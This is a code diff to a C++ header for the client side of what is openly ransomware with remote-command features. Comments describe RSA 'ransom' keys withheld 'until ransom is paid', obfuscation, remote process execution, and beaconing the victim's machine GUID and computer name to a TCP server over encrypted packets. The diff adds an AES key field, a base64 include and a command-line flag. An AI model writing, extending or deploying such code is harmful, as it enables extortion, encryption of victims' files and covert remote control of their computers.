@@ -2,6 +2,7 @@
 
 #include "ProcessManager.h"
 #include "NetworkTypes.h"
+#include "External/base64.h"
 #include "External/obfuscate.h"
 #include "NetworkManager.h"
 
@@ -16,8 +17,10 @@ struct CommandDescription {
     unsigned int creationFlags;
     HANDLE creationContext;
     std::wstring application;
-    std::wstring commandArgs = L"/K ";
-    BOOL respondToServer; // server wants client to respond with status
+    //std::wstring commandArgs = L"/K ";
+    std::wstring commandArgs = L"";
+    bool respondToServer; // server wants client to respond with status
+    bool useCLI;
 };
 
 typedef CommandDescription CMDDESC;
@@ -27,10 +30,12 @@ public:
     const std::string  GetDesktopName()   const { return this->m_ComputerName; }
     const std::string  GetMachineGUID()   const { return this->m_MachineGUID; }
     const RSAKeys      GetRansomSecrets() const { return this->m_RansomSecrets; }
+    const BYTESTRING   GetAESKey()        const { return this->m_AESKey; }
     void               SetDesktopName(auto name) { this->m_ComputerName = name; }
     void               SetMachineGUID(auto name) { this->m_MachineGUID = name; }
     void               SetRequestSecrets(RSAKeys& keys) { this->m_RequestSecrets = keys; }
     void               SetRansomSecrets(RSAKeys& keys) { this->m_RansomSecrets = keys; }
+    void               SetAESKey(BYTESTRING& key) { this->m_AESKey = key; }
 
 private:
     std::string        m_ComputerName   = "";       // remote host computer name. e.g DESKTOP-AJDU31S
@@ -38,6 +43,7 @@ private:
     RSAKeys            m_RequestSecrets = {};       // RSA key pair used to encrypt and decrypt requests to and from server
     RSAKeys            m_RansomSecrets  = {};       // RSA key pair used to encrypt and decrypt files. public key only stored on client until ransom is paid
     SOCKET             m_TCPSocket      = INVALID_SOCKET;
+    BYTESTRING         m_AESKey         = {};
 
 #ifdef CLIENT_RELEASE                               // Client only methods
 public:
@@ -59,7 +65,7 @@ private:
     bool               SendMachineGUIDToServer();   // send machine guid to tcp server. encrypted
     bool               SendComputerNameToServer();  // send desktop computer name to tcp server. encrypted
     bool               IsServerAwaitingResponse(const Packet& commandPerformed);
-    bool               ExchangePublicKeys();        // send client public key, receive server public key
+    bool               ExchangeCryptoKeys();        // send client public key, receive server public key
     Packet             OnEncryptedPacket(BYTESTRING encrypted); // on receive, decrypt and deserialize encrypted packet 
 
     ProcessManager     m_ProcMgr          = {};     // remote host process manager
@@ -68,7 +74,6 @@ private:
     RSA*               m_ServerPublicKey  = {};
     SOCKET             m_UDPSocket        = INVALID_SOCKET;
     NetworkManager     m_NetworkManager   = {};
-    AESkey             m_AESKey           = {};
 
 #elif defined(SERVER_RELEASE)                       // Server only client implementation
 public:
